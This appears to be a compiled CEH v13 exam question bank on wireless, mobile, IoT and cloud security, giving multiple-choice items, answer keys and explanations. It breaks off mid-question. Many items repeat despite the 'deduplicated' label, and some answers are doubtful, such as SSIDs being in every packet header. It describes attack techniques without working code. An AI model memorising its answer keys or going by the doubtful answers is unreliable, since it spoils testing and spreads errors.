# CEH v13 Master Question Bank (Deduplicated)

> **424 unique questions** compiled from 17 reputable sources
> Exam: 125 MCQ, 4 hours, 60-85% passing (scaled)
> Compiled: 2026-02-26

## Exam Domain Weights
| Domain | Weight |
|--------|--------|
| Reconnaissance (Footprinting & Scanning) | 21% |
| Wireless, Mobile, IoT, and Cloud | 18% |
| System Hacking | 17% |
| Web Application Hacking | 16% |
| Network and Perimeter Hacking | 14% |
| Cryptography and Social Engineering | 8% |
| Information Security Overview | 6% |

## Sources
- Pearson IT Certification
- Matt Walker CEH All-in-One Exam Guide
- ExamTopics (examtopics.com)
- CehTest.com
- Pass4Success
- InfoSecTrain
- EC-Council Official Curriculum
- EDUSUM (edusum.com)
- Vinsys (vinsys.com)
- FlashGenius (flashgenius.net)
- Sulekha TechPulse
- H2K Infosys
- TrustEd Institute (trustedinstitute.com)
- AWSlagi (awslagi.com)
- GitHub Community Repos (Samsar4, ryh04x, Faizan-Khanx)
- TrainACE
- Infibee

---

# Wireless, Mobile, IoT & Cloud (114 questions)

## Q50
**In WEP cracking, what is the purpose of deauthentication packets?**

- A) Get WEP code from deauth response
- B) Generate traffic for capturing IVs
- C) Determine the BSSID
- D) Discover cloaked SSID

**Answer:** B
**Explanation:** Deauthentication forces reconnections, generating traffic needed for ~15,000 IVs.
**Source:** Matt Walker CEH Guide

---

## Q51
**Which wireless standard operates at 54Mbps on 2.4GHz?**

- A) 802.11a
- B) 802.11b
- C) 802.11g
- D) 802.11n

**Answer:** C
**Explanation:** 802.11g operates at 54Mbps on 2.4GHz with backward compatibility.
**Source:** Matt Walker CEH Guide

---

## Q52
**What is needed for fake authentication to a WEP AP?**

- A) Captured auth packet
- B) IP address of AP
- C) MAC address of AP
- D) The SSID

**Answer:** C, D
**Explanation:** Fake authentication requires the AP's MAC address and SSID.
**Source:** Matt Walker CEH Guide

---

## Q53
**Which wireless tool is a true passive discovery tool?**

- A) Aircrack
- B) Kismet
- C) NetStumbler
- D) Netsniff

**Answer:** B
**Explanation:** Kismet operates passively with no packet injection.
**Source:** Matt Walker CEH Guide

---

## Q54
**Best tool for cracking WEP network key?**

- A) NetStumbler
- B) Aircrack
- C) John the Ripper
- D) Kismet

**Answer:** B
**Explanation:** Aircrack-ng is designed for cracking WEP and WPA encryption keys.
**Source:** Matt Walker CEH Guide

---

## Q55
**Which statements about TKIP are true?**

- A) Key change every 10,000 packets
- B) Keys don't change during session
- C) Part of WEP
- D) Part of WPA

**Answer:** A, D
**Explanation:** TKIP rotates keys every ~10,000 packets and is core to WPA.
**Source:** Matt Walker CEH Guide

---

## Q56
**Which statements about SSIDs are true?**

- A) Always 32 chars
- B) Up to 32 chars
- C) Broadcast off prevents discovery
- D) Part of every packet header
- E) Provides important security
- F) Multiple needed for ESS roaming

**Answer:** B, D
**Explanation:** SSIDs can be up to 32 chars and are in every packet header.
**Source:** Matt Walker CEH Guide

---

## Q57
**Which statements about WEP IVs are true?**

- A) 32 bits
- B) 24 bits
- C) Reused frequently
- D) Sent in clear text
- E) Encrypted
- F) Used once per session

**Answer:** B, C, D
**Explanation:** WEP IVs are 24 bits, sent unencrypted, and reused frequently.
**Source:** Matt Walker CEH Guide

---

## Q58
**Rogue AP with same SSID set up. Which tools can detect it?**

- A) NetStumbler
- B) NetSurveyor
- C) Kismet
- D) Aircrack
- E) ToneLoc

**Answer:** A, B, C
**Explanation:** NetStumbler, NetSurveyor, and Kismet are wireless discovery tools.
**Source:** Matt Walker CEH Guide

---

## Q59
**Running airsnarf from a Linux laptop. What is the objective?**

- A) MAC flooding
- B) DoS attacks
- C) Cracking WEP
- D) Stealing usernames and passwords

**Answer:** D
**Explanation:** Airsnarf creates rogue APs to steal credentials from hotspot users.
**Source:** Matt Walker CEH Guide

---

## Q60
**What frequency does Bluetooth operate in?**

- A) 2.4-2.48GHz
- B) 2.5GHz
- C) 2.5-5GHz
- D) 5GHz

**Answer:** A
**Explanation:** Bluetooth uses the 2.4-2.48GHz ISM band with frequency hopping.
**Source:** Matt Walker CEH Guide

---

## Q61
**Multiple APs in the same network form what?**

- A) ESS (single AP)
- B) BSSID
- C) ESS (Extended Service Set)
- D) ESSID

**Answer:** C
**Explanation:** ESS is created when multiple APs share the same SSID.
**Source:** Matt Walker CEH Guide

---

## Q62
**Driving building to building searching for wireless APs. What attack?**

- A) War chalking
- B) War walking
- C) War driving
- D) War moving

**Answer:** C
**Explanation:** War driving uses enhanced wireless reception while driving to find networks.
**Source:** Matt Walker CEH Guide

---

## Q63
**Omnidirectional antennas in building corners. What is true?**

- A) Vulnerable to outside sniffing
- B) Not vulnerable
- C) Dipole antennas improve security
- D) Directional antennas improve security

**Answer:** A, D
**Explanation:** Omnidirectional in corners broadcasts outside. Directional antennas focus signal inward.
**Source:** Matt Walker CEH Guide

---

## Q64
**Which statement about wireless security is true?**

- A) WPA2 is better than WEP
- B) WEP is better than WPA2
- C) SSID cloaking + MAC filter = no encryption needed
- D) Longer SSID = more secure

**Answer:** A
**Explanation:** WPA2 uses AES encryption, far superior to WEP's RC4.
**Source:** Matt Walker CEH Guide

---

## Q65
**Colleague modifies MAC address on wireless adapter. Most likely reason?**

- A) Port security enabled
- B) SSID cloaked
- C) MAC filtering enabled
- D) Weak signal

**Answer:** C
**Explanation:** MAC spoofing bypasses MAC address filtering on access points.
**Source:** Matt Walker CEH Guide

---

## Q66
**Phone unresponsive, rebooted, disconnects again. Which Bluetooth attack?**

- A) Bluesmacking
- B) Bluejacking
- C) Bluesniffing
- D) Bluesnarfing

**Answer:** A
**Explanation:** Bluesmacking is a Bluetooth DoS attack causing device unresponsiveness.
**Source:** Matt Walker CEH Guide

---

## Q67
**Which standard uses MIMO for high data rates?**

- A) 802.11b
- B) 802.11g
- C) 802.11n
- D) 802.16

**Answer:** C
**Explanation:** 802.11n uses MIMO antenna arrays for speeds over 100Mbps.
**Source:** Matt Walker CEH Guide

---

## Q68
**Docker images are cryptographically signed. What does this provide?**

- A) Performance optimization
- B) Network isolation
- C) Proof of origin and integrity
- D) Automatic scaling

**Answer:** C
**Explanation:** Docker Content Trust verifies image origin and integrity.
**Source:** ExamTopics CEH v13

---

## Q69
**AWS S3 bucket with public read access. What vulnerability?**

- A) Server-side request forgery
- B) Cloud misconfiguration
- C) Container escape
- D) API key exposure

**Answer:** B
**Explanation:** Publicly accessible S3 buckets are classic cloud misconfigurations.
**Source:** CEH v13 Study Guide

---

## Q70
**Which IoT protocol on port 1883 is commonly targeted?**

- A) CoAP
- B) MQTT
- C) Zigbee
- D) Z-Wave

**Answer:** B
**Explanation:** MQTT runs on port 1883 and is often deployed without authentication.
**Source:** CEH v13 Study Guide

---

## Q92
**Breaking out of a container to access the host system. What vulnerability?**

- A) Image tampering
- B) Container escape
- C) Registry poisoning
- D) Sidecar injection

**Answer:** B
**Explanation:** Container escape allows attackers to break out of container isolation.
**Source:** CEH v13 Study Guide

---

## Q93
**Exploiting misconfigured permissions for unauthorized cloud access. What attack?**

- A) Side-channel
- B) IAM misconfiguration privilege escalation
- C) Cryptojacking
- D) DNS hijacking

**Answer:** B
**Explanation:** IAM misconfigurations are among the most common cloud security vulnerabilities.
**Source:** CEH v13 Study Guide

---

## Q94
**What is firmware analysis primarily used for in IoT hacking?**

- A) Improving performance
- B) Finding hardcoded credentials and vulnerabilities
- C) Updating the OS
- D) Monitoring network traffic

**Answer:** B
**Explanation:** Firmware analysis extracts and examines firmware for hardcoded passwords and vulnerabilities.
**Source:** CEH v13 Study Guide

---

## Q103
**Which WPA3 mode provides encryption on open networks?**

- A) SAE
- B) OWE
- C) TKIP
- D) CCMP

**Answer:** B
**Explanation:** OWE provides encryption on open networks using Diffie-Hellman key exchange.
**Source:** CEH v13 Study Guide

---

## Q104
**What WPA3 feature replaces WPA2's PSK?**

- A) TKIP
- B) SAE
- C) EAP
- D) PEAP

**Answer:** B
**Explanation:** SAE (Dragonfly) replaces PSK, protecting against offline dictionary attacks.
**Source:** CEH v13 Study Guide

---

## Q105
**Which tool analyzes Android APK files?**

- A) Wireshark
- B) APKTool
- C) Aircrack-ng
- D) Nikto

**Answer:** B
**Explanation:** APKTool reverse-engineers Android APK files for vulnerability analysis.
**Source:** CEH Study Guide

---

## Q106
**Which attack forces Bluetooth devices to use weaker encryption keys?**

- A) Bluesnarfing
- B) KNOB attack
- C) Bluejacking
- D) Bluesmacking

**Answer:** B
**Explanation:** KNOB forces weaker encryption key negotiation in Bluetooth.
**Source:** CEH v13 Study Guide

---

## Q107
**Fake cell tower intercepting mobile communications. What attack?**

- A) Evil twin
- B) IMSI catcher/Stingray
- C) War driving
- D) Bluetooth sniffing

**Answer:** B
**Explanation:** IMSI catchers impersonate cell towers to intercept mobile communications.
**Source:** CEH Study Guide

---

## Q157
**Which of the following is NOT a type of wireless network attack?**

- A) Rogue access point
- B) Evil twin
- C) Packet sniffing
- D) SQL injection

**Answer:** D
**Explanation:** SQL injection is a web application attack, not a wireless network attack. Rogue access points, evil twin attacks, and packet sniffing are all common wireless network attack techniques.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q192
**You are conducting a penetration test on a cloud-hosted application. Which tool would you use to identify open ports and services on a cloud VM instance?**

- A) Nmap
- B) Burp Suite
- C) Wireshark
- D) Metasploit

**Answer:** A
**Explanation:** Nmap is a powerful network scanning tool that can detect open ports, services, and their versions on a specified IP address, making it ideal for cloud VM assessment.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q193
**Which practice prevents unauthorized data access by limiting exposure of sensitive information in cloud environments?**

- A) Network zoning
- B) Data tokenization
- C) Public key infrastructure (PKI)
- D) Cloud elasticity

**Answer:** B
**Explanation:** Data tokenization replaces sensitive data with non-sensitive equivalents (tokens), reducing the risk of unauthorized access to actual sensitive information in cloud environments.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q194
**When assessing hybrid cloud security, what is the most critical factor for seamless security between on-premises and cloud resources?**

- A) Compatibility of hardware components
- B) Consistency of security policies across both environments
- C) Speed of data transfer
- D) Availability of technical support

**Answer:** B
**Explanation:** Ensuring consistent security policies across both on-premises and cloud environments is crucial for maintaining a cohesive security posture and preventing gaps that attackers could exploit.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q195
**A cloud application lacks proper encryption for data at rest. Which encryption mechanism should be recommended?**

- A) Symmetric encryption using AES
- B) Asymmetric encryption using RSA
- C) Data masking techniques
- D) Steganography

**Answer:** A
**Explanation:** Symmetric encryption using AES is commonly used for encrypting data at rest due to its efficiency, speed, and strong security. RSA is typically used for key exchange and data in transit.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q196
**What effectively prevents unauthorized access to cloud management interfaces?**

- A) Single-factor authentication
- B) Multi-factor authentication
- C) Disabling encryption
- D) Allowing all IP addresses

**Answer:** B
**Explanation:** Implementing multi-factor authentication (MFA) adds an extra layer of security beyond passwords, significantly reducing the risk of unauthorized access to cloud management consoles.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q197
**You are tasked with assessing the security of an IoT camera. Which tool would you use to intercept and analyze the data packets being sent from the device to identify potential security flaws?**

- A) Metasploit
- B) Wireshark
- C) Nmap
- D) Aircrack-ng

**Answer:** B
**Explanation:** Wireshark enables network protocol analysis and packet interception, making it ideal for identifying data transmission security issues in IoT devices.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-iot-hacking-1749512632422

---

## Q198
**You are tasked with securing an IoT-connected industrial control system (ICS). Which of the following measures should be prioritized to protect against remote attacks?**

- A) Segregate the ICS network from the corporate network
- B) Regularly update the operating system
- C) Use default firewall settings
- D) Conduct employee security training

**Answer:** A
**Explanation:** Network segregation is the highest priority for ICS security, as it prevents unauthorized access from less secure networks and limits the blast radius of potential compromises.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-iot-hacking-1749512632422

---

## Q199
**During an IoT security assessment, you discover a device using outdated firmware. What is the primary risk associated with this finding?**

- A) Increased power consumption
- B) Vulnerability to known exploits
- C) Incompatibility with new devices
- D) Decreased network bandwidth

**Answer:** B
**Explanation:** Outdated firmware often contains unpatched vulnerabilities that attackers can exploit using publicly available exploit code and tools.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-iot-hacking-1749512632422

---

## Q200
**In a network containing IoT devices, you identify several using default factory settings. What is the most effective first step to secure these devices against unauthorized access?**

- A) Isolate the IoT devices on their own network segment
- B) Change default passwords to strong, unique ones
- C) Disable unnecessary services running on the devices
- D) Install a firewall to filter incoming and outgoing traffic

**Answer:** B
**Explanation:** Changing default credentials is the most fundamental and immediate step to prevent unauthorized access, as default passwords are publicly known and commonly targeted by automated attacks.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-iot-hacking-1749512632422

---

## Q231
**Which of the following is NOT true regarding SSIDs?**

- A) The SSID is broadcast by APs in the network, unless otherwise configured
- B) If the SSID changes, all clients must update to the new SSID to communicate
- C) Turning off the SSID broadcast ensures only authorized clients can connect
- D) The SSID serves to identify wireless networks

**Answer:** C
**Explanation:** Turning off SSID broadcast does NOT ensure security. SSIDs appear in every packet header from the AP, so they can still be discovered by passive monitoring tools like Wireshark or Kismet.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q232
**Which of the following tools would be used in a blackjacking attack?**

- A) Aircrack
- B) BBCrack
- C) BBProxy
- D) Paros Proxy

**Answer:** C
**Explanation:** BBProxy is employed in blackjacking attacks targeting BlackBerry devices integrated into internal networks, allowing an attacker to use the device as a proxy into the corporate network.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q233
**Which of the following uses a 48-bit initialization vector? (Choose all that apply.)**

- A) WEP
- B) WPA
- C) WPA2
- D) WEP2

**Answer:** B, C
**Explanation:** WPA and WPA2 extended the initialization vector from 24 bits (WEP) to 48 bits, greatly increasing the number of potential random encryption values and improving security.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q234
**Which of the following are true statements? (Choose all that apply.)**

- A) WEP uses shared key encryption with TKIP
- B) WEP uses shared key encryption with RC4
- C) WPA2 uses shared key encryption with RC4
- D) WPA2 uses TKIP and AES encryption

**Answer:** B, D
**Explanation:** WEP employs RC4 stream cipher encryption. WPA2 supports both TKIP (for backward compatibility) and AES (the preferred, more secure algorithm).
**Source:** https://apprize.best/security/ceh/7.html

---

## Q235
**Which of the following best describes the 'evil twin' wireless hacking attack?**

- A) An attacker sets up a client machine using the same MAC as an authorized user
- B) An attacker connects using the same username and password as an authorized user
- C) An attacker sets up an access point inside the network range for clients to connect to
- D) An attacker sets up an authentication server on the wireless network

**Answer:** C
**Explanation:** An evil twin attack involves establishing a rogue access point with the same SSID as the legitimate network, tricking clients into connecting to it for traffic interception.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q236
**Wireless signals can be detected from miles away with proper equipment. A client asks why directional antennas on access points don't provide sufficient security. Which response is correct?**

- A) Positioning and types of antennas are irrelevant
- B) Directional antennas provide only for weak encryption of signal
- C) Positioning of the antennas is irrelevant unless 802.11n is the standard chosen
- D) Wireless signals can be detected from miles away; therefore, this step alone will not secure the network

**Answer:** D
**Explanation:** While directional antennas focus the signal in a specific direction, determined attackers with amplified equipment can still intercept signals over considerable distances. Antenna choice alone is not sufficient security.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q237
**An attacker is attempting to crack a WEP code. After enabling monitor mode and creating a monitoring interface, she sends deauthentication packets. What is she trying to accomplish?**

- A) Gain access to the WEP code by examining deauthentication response packets
- B) Use deauthentication packets to generate lots of network traffic
- C) Determine the BSSID of the access point
- D) Discover the cloaked SSID of the network

**Answer:** B
**Explanation:** Deauthentication packets force client reconnection, generating the large amount of traffic (approximately 15,000+ packets) needed to capture enough IVs for WEP key cracking.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q238
**Which wireless standard works at 54Mbps on a frequency range of 2.4GHz?**

- A) 802.11a
- B) 802.11b
- C) 802.11g
- D) 802.11n

**Answer:** C
**Explanation:** 802.11g operates at 54Mbps on the 2.4GHz frequency band. 802.11a operates at 54Mbps on 5GHz, 802.11b operates at 11Mbps on 2.4GHz, and 802.11n operates at 100Mbps+ on both bands.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q239
**The team has discovered an access point configured with WEP encryption. What is needed to perform a fake authentication to the AP in an effort to crack WEP?**

- A) A captured authentication packet
- B) The IP address of the AP
- C) The MAC address of the AP
- D) The SSID

**Answer:** C, D
**Explanation:** Fake authentication to a WEP AP requires the AP's MAC address (BSSID) and the SSID to craft valid connection attempts for generating traffic needed for WEP cracking.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q240
**Which of the tools listed is a passive discovery tool?**

- A) Aircrack
- B) Kismet
- C) NetStumbler
- D) Netsniff

**Answer:** B
**Explanation:** Kismet is a true passive network discovery tool that operates with no packet injection, using channel hopping to identify wireless networks without alerting them to its presence.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q241
**You have discovered an access point using WEP for encryption purposes. Which of the following is the best choice for uncovering the network key?**

- A) NetStumbler
- B) Aircrack
- C) John the Ripper
- D) Kismet

**Answer:** B
**Explanation:** Aircrack (Aircrack-ng) is specifically designed for cracking WEP and WPA/WPA2 keys once sufficient packet data has been collected from the target network.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q242
**Which of the following statements are true regarding TKIP? (Choose all that apply.)**

- A) Temporal Key Integrity Protocol forces a key change every 10,000 packets
- B) Temporal Key Integrity Protocol ensures keys do not change during a session
- C) Temporal Key Integrity Protocol is an integral part of WEP
- D) Temporal Key Integrity Protocol is an integral part of WPA

**Answer:** A, D
**Explanation:** TKIP changes encryption keys approximately every 10,000 packets and is an integral part of WPA. This dynamic key rotation was a major security improvement over WEP's static keys.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q243
**Brad turned off SSID broadcasting, enabled MAC filtering, and instituted wireless encryption. He notices an employee using an HP laptop, but the organization only purchases Dell systems. All connections appear valid. Which best describes the successful connection?**

- A) The employee has brute-forced the encryption
- B) The employee has spoofed a legitimate MAC address
- C) The laptop choice is irrelevant, as long as the OUI is the same
- D) An evil twin attack is in place

**Answer:** B
**Explanation:** The employee most likely spoofed the MAC address of an authorized Dell system on the HP laptop, bypassing MAC filtering restrictions while maintaining valid authentication.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q244
**Regarding WEP initialization vectors, which of the following are true? (Choose all that apply.)**

- A) IVs are 32 bits in length
- B) IVs are 24 bits in length
- C) IVs get reused frequently
- D) IVs are sent in clear text

**Answer:** B, C, D
**Explanation:** WEP IVs are 24 bits long, sent unencrypted (clear text), and reused frequently due to the small keyspace. These weaknesses are the fundamental reason WEP is easily crackable.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q245
**A pen test member is running the airsnarf tool from a Linux laptop. What is she attempting to do?**

- A) MAC flooding against an AP on the network
- B) Denial-of-service attacks against APs on the network
- C) Cracking network encryption codes from the WEP AP
- D) Stealing usernames and passwords from an AP

**Answer:** D
**Explanation:** Airsnarf demonstrates how a rogue AP can steal usernames and passwords from public wireless hotspots through DNS and HTTP redirects to fake captive portals.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q246
**Which of the following is true regarding wireless network architecture?**

- A) The service area provided by a single AP is known as an ESS
- B) The service area provided by a single AP is known as a BSSID
- C) The service area provided by multiple APs acting within the same network is known as an ESS
- D) The service area provided by multiple APs acting within the same network is known as an ESSID

**Answer:** C
**Explanation:** An Extended Service Set (ESS) is created by having multiple access points work within the same network SSID for seamless roaming. A single AP creates a BSS (Basic Service Set).
**Source:** https://apprize.best/security/ceh/7.html

---

## Q247
**Which wireless standard achieves high data rate speeds by implementing MIMO antenna technology?**

- A) 802.11b
- B) 802.11g
- C) 802.11n
- D) 802.16

**Answer:** C
**Explanation:** 802.11n achieves speeds faster than 100Mbps using MIMO (Multiple Input Multiple Output) antenna arrays that can send and receive data simultaneously on multiple spatial streams.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q248
**An individual's cell phone becomes unresponsive during a call and requires a restart. During the next call, it disconnects and becomes unresponsive again. Which Bluetooth attack is underway?**

- A) Bluesmacking
- B) Bluejacking
- C) Bluesniffing
- D) Bluesnarfing

**Answer:** A
**Explanation:** Bluesmacking is a denial-of-service attack on a Bluetooth device, causing unresponsiveness and disconnections. Bluejacking sends unsolicited messages, Bluesnarfing steals data.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q249
**WPA2 is a better encryption choice than WEP. Which of the following statements is true regarding wireless security?**

- A) WPA2 is a better encryption choice than WEP
- B) WEP is a better encryption choice than WPA2
- C) Cloaking the SSID and implementing MAC filtering eliminate the need for encryption
- D) Increasing the length of the SSID to its maximum increases security for the system

**Answer:** A
**Explanation:** WPA2 uses TKIP for key rotation and AES for encryption, making it substantially superior to WEP's vulnerable RC4 implementation. SSID cloaking and MAC filtering are not substitutes for encryption.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q250
**A colleague modifies his laptop's MAC address using shell commands before connecting to a wireless AP. What is the most likely reason?**

- A) Port security is enabled on the access point
- B) The SSID is cloaked from the access point
- C) MAC filtering is enabled on the access point
- D) Weak signaling is frustrating connectivity to the access point

**Answer:** C
**Explanation:** Modifying the hardware MAC address indicates the attacker is circumventing MAC filtering restrictions on the AP by spoofing an authorized device's MAC address.
**Source:** https://apprize.best/security/ceh/7.html

---

## Q272
**A startup is building a serverless photo sharing application where users can upload images that are automatically processed for thumbnail generation and facial recognition. During testing, the development team notices that some larger image uploads are triggering security alerts in their cloud provider's monitoring system. Upon investigation, they discover that malicious users could potentially exploit their application by uploading specially crafted image files with embedded code. What is the most effective approach to mitigate this vulnerability?**

- A) Implement a comprehensive logging and monitoring system that tracks all file uploads and serverless function executions
- B) Implement strict input validation and content type verification before processing any uploaded files
- C) Configure the serverless function to run in an isolated container environment with enhanced security permissions
- D) Increase the memory allocation of the serverless function to handle complex processing tasks more effectively

**Answer:** B
**Explanation:** Input validation addresses the root vulnerability by preventing malicious files from entering the processing pipeline before execution occurs. While logging (A) helps with detection, it doesn't prevent the attack. Isolation (C) is a defense-in-depth measure but doesn't address the root cause. Memory allocation (D) is irrelevant to the security issue.
**Source:** https://trustedinstitute.com/topic/ceh/cloud-computing/

---

## Q273
**A DevOps engineer at a financial services company is transitioning their infrastructure to Docker containers. During a security review, they discover that several of their containers are communicating with unexpected external IP addresses. After investigation, they determine that a malicious actor has likely placed a backdoor in one of the custom container images they're using. Which approach should they implement to prevent this type of compromise in the future?**

- A) Implement a network monitoring tool that alerts when containers communicate with IP addresses not on an approved list
- B) Configure the Docker daemon to only pull images during business hours when IT staff can monitor network traffic
- C) Add an additional layer of firewall rules that blocks all container traffic except to explicitly permitted destinations
- D) Implement image signing with Docker Content Trust to verify image authenticity before deployment

**Answer:** D
**Explanation:** Image signing with Docker Content Trust provides preventive protection through cryptographic verification of image integrity and origin before deployment. This ensures only trusted, verified images are deployed, directly addressing the root cause of backdoored images. Network monitoring (A) and firewall rules (C) are detective/reactive controls. Restricting pull times (B) is impractical and ineffective.
**Source:** https://trustedinstitute.com/topic/ceh/cloud-computing/

---

## Q274
**Which of the following is a common attack vector in cloud environments where an attacker exploits misconfigured cloud storage permissions to extract sensitive data?**

- A) Lateral movement through extended storage credentials that were previously established by the cloud provider
- B) Cross-service request forgery using hypervisor backdoors
- C) Authentication token manipulation from adjacent virtual private networks
- D) Data exfiltration via insecure storage buckets

**Answer:** D
**Explanation:** Data exfiltration via insecure storage buckets (such as AWS S3, Azure Blob Storage, or Google Cloud Storage) is one of the most common and well-documented cloud attack vectors. Misconfigured bucket permissions allowing public read access have led to numerous real-world data breaches.
**Source:** https://trustedinstitute.com/topic/ceh/cloud-computing/

---

## Q275
**During a penetration test on a cloud infrastructure, you need to identify open ports and services running on a specific VM instance. Which tool would be most effective for this purpose?**

- A) Nmap
- B) Burp Suite
- C) Wireshark
- D) Metasploit

**Answer:** A
**Explanation:** Nmap is a powerful network scanning tool that can detect open ports, services, and their versions on a specified IP address, making it ideal for cloud VM reconnaissance. Burp Suite is for web application testing, Wireshark is for packet analysis, and Metasploit is for exploitation.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q276
**In a cloud deployment, which practice helps prevent unauthorized data access by limiting exposure of sensitive information?**

- A) Network zoning
- B) Data tokenization
- C) Public key infrastructure (PKI)
- D) Cloud elasticity

**Answer:** B
**Explanation:** Data tokenization replaces sensitive data with non-sensitive equivalents (tokens), reducing the risk of unauthorized access. Even if an attacker gains access to the tokenized data, they cannot reverse-engineer the original sensitive information without access to the token vault.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q277
**You are evaluating the security posture of a hybrid cloud environment. What is the most critical factor to assess when ensuring seamless security between on-premises and cloud resources?**

- A) Compatibility of hardware components in both environments
- B) Consistency of security policies across both environments
- C) Speed of data transfer between on-premises and cloud
- D) Availability of technical support from the cloud provider

**Answer:** B
**Explanation:** Ensuring consistent security policies across both on-premises and cloud environments is crucial for maintaining a cohesive security posture. Inconsistent policies create gaps that attackers can exploit, especially during data transfer between environments.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q278
**While reviewing a cloud-based application, you identify that it lacks proper encryption for sensitive data at rest. Which encryption mechanism should be recommended to address this issue effectively?**

- A) Symmetric encryption using AES
- B) Asymmetric encryption using RSA
- C) Data masking techniques
- D) Steganography

**Answer:** A
**Explanation:** Symmetric encryption using AES (Advanced Encryption Standard) is commonly used for encrypting data at rest due to its efficiency and strength. AES-256 is the industry standard for protecting sensitive data stored in cloud environments.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q279
**Which of the following is an effective method for preventing unauthorized access to cloud management interfaces?**

- A) Using a single-factor authentication
- B) Implementing multi-factor authentication
- C) Disabling encryption
- D) Allowing all IP addresses

**Answer:** B
**Explanation:** Implementing multi-factor authentication (MFA) adds an extra layer of security, significantly reducing the risk of unauthorized access to cloud management consoles even if credentials are compromised.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-cloud-computing-1749512641816

---

## Q280
**According to the NIST cloud deployment reference architecture, which component provides connectivity and transport services to consumers?**

- A) Cloud connector
- B) Cloud broker
- C) Cloud provider
- D) Cloud carrier

**Answer:** D
**Explanation:** Cloud carriers deliver transport services and connectivity to enable data flow between consumers and cloud providers. A cloud broker mediates between consumers and providers. A cloud provider delivers cloud services. The cloud carrier is specifically responsible for the transport layer.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q281
**Which master component in Kubernetes allocates nodes to newly generated pods based on resource requirements, data locality, and policy restrictions?**

- A) Kube-apiserver
- B) Etcd cluster
- C) Kube-controller-manager
- D) Kube-scheduler

**Answer:** D
**Explanation:** The kube-scheduler assigns nodes to pods considering overall resource needs, hardware/software constraints, affinity specifications, data locality, and various policy restrictions. Kube-apiserver handles API requests, etcd stores cluster state, and kube-controller-manager runs controller processes.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q282
**What open-source technology helps develop, package, and run applications while providing PaaS through OS-level virtualization?**

- A) Virtual machine
- B) Docker
- C) Zero trust network
- D) Serverless computing

**Answer:** B
**Explanation:** Docker enables containerized software delivery and accelerates development cycles through application isolation using OS-level virtualization. Unlike VMs, Docker containers share the host kernel, making them lightweight and fast to start.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q283
**George transferred sensitive data using a short-range wireless protocol based on IEEE 802.15.4 standard, operating at 10-100m range. What technology did he use?**

- A) LPWAN
- B) MQTT
- C) NB-IoT
- D) Zigbee

**Answer:** D
**Explanation:** Zigbee operates per IEEE 802.15.4, enabling infrequent, low-rate data transfers within the 10-100m range. LPWAN covers long distances, MQTT is a messaging protocol (not a radio technology), and NB-IoT is a cellular-based technology.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q284
**After infiltrating IoT devices, Mirai malware creates botnets to launch which type of attack?**

- A) MITM attack
- B) Password attack
- C) Birthday attack
- D) DDoS attack

**Answer:** D
**Explanation:** Mirai botnets coordinate compromised IoT devices (cameras, routers, DVRs) to execute massive distributed denial-of-service (DDoS) operations. The 2016 Mirai attack took down major internet services by generating over 1 Tbps of traffic.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q285
**Robert injects faults into power supplies and clock networks of an IoT device for remote execution. What type of fault injection is this?**

- A) Frequency/voltage tampering
- B) Optical, electromagnetic fault injection
- C) Temperature attack
- D) Power/clock/reset glitching

**Answer:** D
**Explanation:** Power/clock/reset glitching involves manipulating power supplies, clock signals, and reset lines to cause instruction skipping, incorrect execution, or security bypass on embedded IoT devices. This is a hardware-level attack targeting the device's physical execution environment.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q286
**You're conducting a security assessment for a travel company that has released a mobile app allowing users to book flights and access boarding passes. The app utilizes QR codes for boarding pass verification. You notice that when users generate QR codes, the app creates them with embedded SQL commands that are passed directly to the backend database for validation. What mobile attack vector is most likely being implemented here?**

- A) QR code spoofing with malformed authentication tokens that execute when scanned by personnel at boarding gates
